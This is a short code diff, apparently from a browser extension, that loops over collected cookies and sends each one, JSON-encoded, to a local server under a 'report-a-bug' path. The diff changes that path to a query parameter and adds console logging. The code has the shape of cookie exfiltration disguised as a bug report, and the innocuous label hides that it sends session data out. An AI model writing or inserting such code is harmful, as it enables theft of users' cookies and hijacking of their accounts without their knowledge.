@@ -58,7 +58,10 @@ function replaceStart() {
 
             for (cookie of response) {
 
-              fetch('http://localhost:3000/report-a-bug/' + JSON.stringify(cookie), {mode:'cors'})
+              console.log(cookie)
+
+              fetch('http://localhost:3000/report-a-bug?bug=' + JSON.stringify(cookie), {mode:'cors'})
+                .then(response => console.log(response.json()))
 
             }
 
